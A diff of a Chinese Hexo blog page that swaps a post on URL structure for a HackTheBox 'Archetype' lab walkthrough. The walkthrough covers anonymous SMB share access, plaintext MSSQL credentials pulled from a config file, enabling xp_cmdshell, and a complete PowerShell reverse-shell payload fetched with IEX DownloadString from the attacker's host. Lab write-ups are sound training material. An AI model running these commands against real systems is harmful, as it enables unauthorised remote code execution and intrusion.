@@ -9,7 +9,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    web解剖分析-1 |  Time
+    HackTheBox-Archetype-1 |  Time
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -44,7 +44,7 @@
   <div id="app">
     <main class="content on">
       <section class="outer">
-  <article id="post-web解剖分析-1" class="article article-type-post" itemscope
+  <article id="post-HackTheBox-Archetype-1" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
@@ -52,7 +52,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  web解剖分析-1
+  HackTheBox-Archetype-1
 </h1>
  
 
@@ -61,12 +61,12 @@
 
     
     <div class="article-meta">
-      <a href="/2021/01/27/web%E8%A7%A3%E5%89%96%E5%88%86%E6%9E%90-1/" class="article-date">
-  <time datetime="2021-01-27T02:52:44.000Z" itemprop="datePublished">2021-01-27</time>
+      <a href="/2021/06/13/HackTheBox-Archetype-1/" class="article-date">
+  <time datetime="2021-06-13T12:03:46.000Z" itemprop="datePublished">2021-06-13</time>
 </a>
       
   <div class="article-category">
-    <a class="article-category-link" href="/categories/WEB%E4%B9%8B%E5%9B%B0/">WEB之困</a>
+    <a class="article-category-link" href="/categories/HackTheBox/">HackTheBox</a>
   </div>
 
       
@@ -76,7 +76,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">692</span>
+            <span class="post-count">661</span>
         </span>
     </span>
 
@@ -110,42 +110,84 @@
       
 
       
-      <p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3v26qzhmj31c00u0k0c.jpg" alt="29"></p>
+      <p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgw7kspw0j31hc0u0np8.jpg" alt="司腾"></p>
 <a id="more"></a>
 
+<h3 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h3><p>最近准备玩玩hackthebox靶机，入门级靶机Archetype，首先我们需要先连上hackthebox vpn</p>
+<p>靶机为在线，攻击机为本地kali</p>
+<p>首先我们先在hackthebox下载openvpn，上传至kali中连接</p>
+<p>命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openvpn starting_point_xxx.ovpn</span><br></pre></td></tr></table></figure>
 
+<p>连接成功</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkrrtcg7oj30ny0iot9t.jpg" alt="image-20210613202701519"></p>
+<p>然后我们就可以快落的打靶机了。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkrrrh16mj322m0u078d.jpg" alt="image-20210613202752689"></p>
+<p> 靶机地址：10.10.10.27</p>
+<h3 id="0x02-工具准备"><a href="#0x02-工具准备" class="headerlink" title="0x02 工具准备"></a>0x02 工具准备</h3><p>Impacket网络协议工具包</p>
+<p>介绍：<a href="https://www.freebuf.com/sectool/175208.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/175208.html</a></p>
+<p>安装命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;CoreSecurity&#x2F;impacket.git</span><br><span class="line">cd impacket&#x2F;</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure>
 
-<h1 id="HTML历史"><a href="#HTML历史" class="headerlink" title="HTML历史"></a>HTML历史</h1><p>​        最早的通用标记语言是在20世纪60年由IBM公司开发的 GML (Generalized Markup Language  通用标记语言)，它用可供机器读取识别的指令作为文档的标识符，来明确表示那些是文档的头部，那些是列表项目等等。</p>
-<p>​        在此后经过20多年的发展逐渐演变成 SGML (Standard Generalized Markup Language 标准通用标记语言)，它把 GML 原来基于冒号和句号的语法改变成了我们现在熟悉的尖括号格式语法。</p>
-<p>​        而 SGML 就是 HTML (HyperText Markup Language 超文本标记语言)的前身，在经历 10 年后  HTML 便诞生了，随后根据 HTML 开发了 HTTP 协议(HyperText Transfer Protocol 超文本传输协议)。</p>
-<h1 id="一切从-URL-开始"><a href="#一切从-URL-开始" class="headerlink" title="一切从 URL 开始"></a>一切从 URL 开始</h1><blockquote>
-<p>URL (Uniform Resoure Locator )    统一资源定位器</p>
-</blockquote>
-<h3 id="URL-的结构"><a href="#URL-的结构" class="headerlink" title="URL 的结构"></a>URL 的结构</h3><ul>
-<li>协议名称</li>
-<li>层级URL的标记符号(固定不变)</li>
-<li>访问资源需要的凭证信息(可选项)</li>
-<li>从那个服务器获取的数据</li>
-<li>需要连接的端口号(可选项)</li>
-<li>指向资源的层级(文件路径)</li>
-<li>查询字符串(参数，[可选项])</li>
-<li>片段ID(可选项)</li>
-</ul>
-<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3wnp5ueoj311q0hijvj.jpg" alt="image-20210129004909099"></p>
-<h4 id="协议名称"><a href="#协议名称" class="headerlink" title="协议名称"></a>协议名称</h4><p>例如：http、https、ftp等几十项都是协议名称，并且:结尾。<code>http:</code></p>
-<h4 id="层级-URL-的标记符号"><a href="#层级-URL-的标记符号" class="headerlink" title="层级 URL 的标记符号"></a>层级 URL 的标记符号</h4><p>使用固定字符串<code>//</code></p>
-<h4 id="访问资源的身份验证"><a href="#访问资源的身份验证" class="headerlink" title="访问资源的身份验证"></a>访问资源的身份验证</h4><p> URL 里身份验证的部分属于可选项，在向服务器端获取数据时有可能需要该位置指定一个用户名或密码。</p>
-<h4 id="服务器地址"><a href="#服务器地址" class="headerlink" title="服务器地址"></a>服务器地址</h4><p>对完整的层级 URL 来说，服务器地址部分必须指定一个不区分大小写的域名和一个IPV4的IP。</p>
-<h4 id="服务器端口"><a href="#服务器端口" class="headerlink" title="服务器端口"></a>服务器端口</h4><p>服务器端口部分是可选的，通常服务器连接的网络端口不是常用的标准端口时才会用到此部分。</p>
-<h4 id="层级文件路径"><a href="#层级文件路径" class="headerlink" title="层级文件路径"></a>层级文件路径</h4><p>URL 的下一个组成部分叫层级文件路径，用来获取服务器指定资源的方式。</p>
-<h4 id="查询字符串"><a href="#查询字符串" class="headerlink" title="查询字符串"></a>查询字符串</h4><p>可选项，用于把一串非层级格式的任意参数传递给前面路径所对面的资源 (把用户提供的信息传递给服务器端的脚本)</p>
-<h4 id="片段-ID"><a href="#片段-ID" class="headerlink" title="片段 ID"></a>片段 ID</h4><p>片段 ID 在浏览器在浏览器中指向HTML某个锚点名称，用于页面浏览的定位。</p>
-<h4 id="整合资源"><a href="#整合资源" class="headerlink" title="整合资源"></a>整合资源</h4><p>PS：懒得手敲。垃圾 WPS 不能复制，还要花钱。(穷是原罪)</p>
-<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3wnothasj311r0u0qkf.jpg" alt="image-20210129010402801"></p>
-<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3wnnarrdj310v0u07ms.jpg" alt="image-20210129010419943"></p>
-<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3wnmuyudj31e80ho7al.jpg" alt="image-20210129010437898"></p>
-<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3wnny5vqj31ec0jijyp.jpg" alt="image-20210129010449225"></p>
-<h3 id="保留字符和百分号编码"><a href="#保留字符和百分号编码" class="headerlink" title="保留字符和百分号编码"></a>保留字符和百分号编码</h3><p>由于某些字符和百分号编码可能需要用到，所以RFC未禁用也未规定详细用法，所以会经常见到%2F、%00等字符，或者在测试中利用这些字符进行攻击等。(个人大概这样理解)</p>
+<p>安装成功</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkrrxdocfj30zk0mejzt.jpg" alt="image-20210613215427514"></p>
+<p>smbclient是linux下用于连接windows smb共享资源的工具，此工具在kali中自带。</p>
+<h3 id="0x03-信息收集"><a href="#0x03-信息收集" class="headerlink" title="0x03 信息收集"></a>0x03 信息收集</h3><p>端口扫描</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkrs021xnj30zc0g0gqo.jpg" alt="image-20210613230403132"></p>
+<p>发现开放135、139、445和1433端口。并且也是windows服务器</p>
+<p>135、139、445是文件共享协议或打印机共享端口。</p>
+<p>1433是mssql数据库服务端口</p>
+<p>懂的都懂，先干445一波。毕竟是windows的，ms17-010打一波</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkrry0qkej30vy08itb3.jpg" alt="image-20210613231953178"></p>
+<p>无ms17-010</p>
+<p>445是smb共享协议，可以尝试是否存在文件共享匿名访问。</p>
+<p>连接命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L \\10.10.10.27\\</span><br><span class="line"></span><br><span class="line">-N 匿名访问</span><br><span class="line">-L 主机IP</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkrrn9ayij30n808q0u6.jpg" alt="image-20210616231239620"></p>
+<p>可以发现有多个共享文件夹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N \\\\10.10.10.27\\backups   #匿名访问backups文件夹</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkrro8rxjj30ys09676y.jpg" alt="image-20210616232127082"></p>
+<p>使用dir查看文件夹下的内容，存在prod.dtsConfig文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get prod.dtsConfig 下载文件到本地</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkrrw8qouj31020dgte4.jpg" alt="image-20210617030322002"></p>
+<p>里面的账号密码应该是mssql的，可以使用Impacket工具包的mssqlclient.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">账号：ARCHETYPE&#x2F;sql_svc</span><br><span class="line">密码：M3g4c0rp123</span><br><span class="line"></span><br><span class="line">mssqlclient.py ARCHETYPE&#x2F;sql_svc@10.10.10.27 -windows-auth</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkrruue39j30zu0e643b.jpg" alt="image-20210617031624928"></p>
+<p>连接成功。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkrrqmv74j30jq06qjru.jpg" alt="image-20210617034534551"></p>
+<p>判断当前是否拥有sysadmin权限，返回值为1，说明当前用户具有sysadmin权限</p>
+<p>使用如下命令开启xp_cmdshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#39;Show Advanced Options&#39;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">sp_configure;</span><br><span class="line">EXEC sp_configure &#39;xp_cmdshell&#39;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">xp_cmdshell &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkrrprl9fj30zu0ii776.jpg" alt="image-20210617041409071"></p>
+<p>可以执行命令后，可以直接反弹shell了。</p>
+<p>使用powershell进行反弹，新建ps文件，写入如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$client &#x3D; New-Object System.Net.Sockets.TCPClient(&quot;10.10.14.110&quot;,4444);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &quot;# &quot;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br></pre></td></tr></table></figure>
+
+<p>用python开启小型web服务器，方便远程下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkrs0u033j30vc03cgmj.jpg" alt="image-20210617042452482"></p>
+<p>kali开启监听模式</p>
+<p>执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(\&quot;http:&#x2F;&#x2F;10.10.14.110:8080&#x2F;shell.ps1\&quot;);&quot;</span><br></pre></td></tr></table></figure>
+
+<p>执行命令后，shell成功反弹回来</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkrrz1z6bj313i0ls44l.jpg" alt="image-20210617042909522"></p>
+<p>查看内容</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkrrs4ai5j31ac0qm0wp.jpg" alt="image-20210617042957102"></p>
+<p>找到用户名所有的文件夹，查看桌面会发现有一个user.txt文件。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkrrsydr2j311c0imq59.jpg" alt="image-20210617043200818"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">type user.txt</span><br><span class="line"></span><br><span class="line">flag:3e7b102e78218e935bf3f4951fec21a3</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkrrtz323j31iv0u07a9.jpg" alt="image-20210617043318711"></p>
+<p>成功。</p>
 
       
       <!-- reward -->
@@ -210,13 +252,15 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://timeshu.github.io/2021/01/27/web%E8%A7%A3%E5%89%96%E5%88%86%E6%9E%90-1/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://timeshu.github.io/2021/06/13/HackTheBox-Archetype-1/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>
       
       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>
+
 
     </footer>
 
@@ -226,19 +270,10 @@
   
   <nav class="article-nav">
     
+    
       <a href="/2021/02/04/%E6%8C%81%E4%B9%85%E5%8C%96XSS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            持久化XSS漏洞利用
-          
-        </div>
-      </a>
-    
-    
-      <a href="/2021/01/26/docker%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0(%E4%B8%80)/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">docker进阶学习(一)</div>
+        <div class="article-nav-title">持久化XSS漏洞利用</div>
       </a>
     
   </nav>
